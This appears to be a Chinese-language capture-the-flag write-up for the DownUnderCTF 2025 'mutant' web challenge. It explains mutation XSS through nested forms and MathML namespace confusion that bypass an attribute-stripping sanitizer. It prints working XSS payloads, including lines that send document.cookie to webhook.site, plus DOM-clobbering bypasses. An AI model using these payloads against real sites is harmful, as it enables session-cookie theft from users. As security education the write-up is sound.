##### tags: `DownUnderCTF_2025`
# DownUnderCTF 2025 WEB : mutant

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

<span class=""></span>

## <span class="red">題目</span>

- ![image](https://hackmd.io/_uploads/S1Ar6O5Ile.png)

## <span class="red">解題過程 (After Event)</span>

1. **這(應該)是一題 XSS 題，原始碼在圖片下方。這題的出題者寫了很多 `console.log` 幫助我們在解題時可以觀察 browser 解析時具體的結果是甚麼**

- <img src="https://hackmd.io/_uploads/BynmTf08xl.png" style="max-width:80%;">

    ```javascript=
    const inp = new URLSearchParams(location.search).get("input");

    // Reporting stuff
    reportbtn.addEventListener("click", () => {
      fetch("/report", {
        method: "POST",
        body: inp,
      })
        .then((r) => alert("Successfully reported"))
        .catch(alert);
    });

    // Challenge
    mytextarea.value = inp;

    console.log("Original", inp);

    const t = document.createElement("template");
    t.innerHTML = inp; // inject payload into template.innerHTML

    console.log("After injecting into template", t.innerHTML);

    const nodes = [t.content];
    while (nodes.length > 0) {
      const n = nodes.pop();

      console.log("Parsed element", n.outerHTML);

      if (n.attributes) {
        while (n.attributes.length > 0) {
          n.removeAttribute(n.attributes[0].name);
        }
      }

      // Fix XSS reported by our bug bounty community
      if (
        n.nodeName !== "#document-fragment" &&
        (n.nodeName.length === 6 || n.nodeName.length === 8)
      ) {
        n.parentNode.removeChild(n);
        continue;
      }

      for (let i = n.children.length - 1; i >= 0; i--) {
        nodes.push(n.children[i]);
      }
    }

    console.log("After sanitization", t.innerHTML);

    myoutputdebug.innerText = t.innerHTML;
    myoutput.innerHTML = t.innerHTML;

    console.log("Final", myoutput.innerHTML);

    ```

&emsp;

2. **結合這一題的題目名稱 `mutant` ，這題應該是在考 `XSS mutation` ，這個漏洞產生的原因是 HTML 字串在 render 時行為會被 browser 改變。首先先用最常見的 `XSS payload : <script>alert('XSS')</script>` 試試看會發生甚麼，測試後可以在 console 看到輸出**

- ![image](https://hackmd.io/_uploads/SkkueQRUle.png)

- ![image](https://hackmd.io/_uploads/BJQuZQCLxg.png)

    - **在 `const nodes = [t.content];` 時， `template.content` 的結果是 `DocumentFragment` ，這也是為何<span class="red">第一次 `while loop` 內 `Parsed element` 會顯示 `undefined`</span> (因為 `DocumentFragment` 本身沒有 `outerHTML` 這個屬性)**
    - **`DocumentFragment` 文件： https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment**
    - ![image](https://hackmd.io/_uploads/Bk9YPQCLxx.png)
    - **第二次 loop 則是因為 `n.nodeName.length === 6` (script 字母的長度)而被刪除， `<script>` 本身沒有任何屬性，所以 `n.attributes.length = 0` 跳出第一個 `if` 檢查 (`n.attributes = NamedNodeMap` ，所以 `if (n.attributes)` 為真)**

&emsp;

3. **接著去找一些相關資料，會發現有一些古老(？)的 payload 可以先嘗試看看，像是 `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">` ，一樣可以回到 console 觀察，發現確實所有的標籤都從 `<svg>` 內跳出來了，但是問題出在 `src` 這個 `attribute` 被 `n.removeAttribute` 移除掉了最後只剩下 `<img>` 這個 `label`**

- **Mutation XSS : https://aszx87410.github.io/beyond-xss/ch2/mutation-xss/**

- ![image](https://hackmd.io/_uploads/HydUgVAUge.png)

&emsp;

4. **也就是說現在確定了可以做到 `(mutation) xss` ，這時就要用上另一個方法來繞過遍歷 `node` 清除 `attribute` 的 `sanitizer` —— `nested form (巢狀 form) + namespace (命名空間)`**

- **payload ：`<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`**

- **先利用 `nested form` 造成 `<mglyph>` 是 `<mtext>` 的直接子節點(因為第二個 form 在 browser 的 html 規範是不被允許的，所以會直接被移除)，然後再利用如果 `<mglyph>` 是 `<mtext>` 的直接子節點會造成 `<mglyph>` 和後續的子節點都在 `MathML namespace` 而非 `html namespace` 之中**
    - **舉例：假設有一段 `nested form` 為 `<form id="outer"><div></form><form id="inner"><input>` ， `DOM tree` 為以下圖片的樣子**
    - **這涉及到 `<form>` 建立時使用了 `form element pointer` ，只有當這個指標是 `null` 時 `<form>` 才會建立，而 `</form>` 會將指標指向 `null`**
    - ![image](https://hackmd.io/_uploads/ryLAIRkwxg.png)
    - **但是當 `HTML parser` 自動修復這段 `nested form` 之後，整段內容就會變成 `<form id="outer"><div><form id="inner"><input></form></div></form>` ，最後解析成 `DOM tree` 時第二個 `<form>` 就會 loss 掉**
    - ![image](https://hackmd.io/_uploads/SJjHU0ywlg.png)

- **因此 `foreign content` 的性質可以拿來做 exploit 。以 payload 舉例，正常在 `html namespace` 中的 `<style>` 只能包含 `text` 、不具有子元素 `(descendants)` 且 `HTML` 實體 `(entities)` 不會被解碼 `(decode)`；但是如果今天 `<style>` 在 `MathML namespace` 之中， `<style>` 就可以擁有子元素且 `HTML` 實體會被解碼**

- **所以原先 payload 會產生這樣的 `DOM tree` (看起來 `alert` 位於 style 內，無害)：**
    - ![image](https://hackmd.io/_uploads/SyM53Tyvll.png)

- **但是當再次解析 `(reparsing)` 時，就會變成：**
    - ![image](https://hackmd.io/_uploads/HJF-6a1vex.png)

&emsp;

5. **理論上是這樣沒錯，但是還記得我們不能用`長度 = 6 or 8`的元素嗎？也就是說我們不能用 `<mglyph>` ，但是我們還能用另一個也會有同樣效果的元素 `<malignmark> (長度為 10)`**

- ![image](https://hackmd.io/_uploads/rkVeCaJvxg.png)

- **所以 payload 變成： `<form><math><mtext></form><form><malignmark><style></math><img src onerror=alert(1)>`**

- <img src="https://hackmd.io/_uploads/SyY4yCJPee.png" style="max-width:80%;">

- **最後在把 payload 中的 `alert(1)` 換成 `fetch("//webhook.site/?flag="+document.cookie)` 就成功拿到 flag 了**

- ![image](https://hackmd.io/_uploads/B1MgLOA8xl.png)

- **flag🚩 :`DUCTF{if_y0u_d1dnt_us3_mutation_x5S_th3n_it_w45_un1nt3nded_435743723}`**

- ![image](https://hackmd.io/_uploads/S1kk3W0Igg.png)

## <span class="red">心得</span>

1. **其他成功的方法還有：**
    - **利用`<annotation-xml encoding="text/html">` 是 `HTML integration points` ，且 `<math>` 底下本來就可以放 `annotation-xml` 不需要用 `nested form` 接起來：**
        - **`<math><annotation-xml encoding="text/html"><style><img src onerror=alert(document.cookie)>`**
    
    - **`<form id=x tabindex=0 onfocus='fetch("https://webhook.site/aa?c="+document.cookie)' autofocus><input id=attributes>Click me`**
    
    - **`<form><input id=children><img src=x onerror=alert(document.cookie)></form>`**

&emsp;

2. **甚至還有非預期解 (對 `n.attribute` 做 `DOM Clobbering`)：**
    - **`<style>@keyframes x{}</style><form style="animation-name:x" onanimationend="alert(1)"><input id="attributes"/></form>`**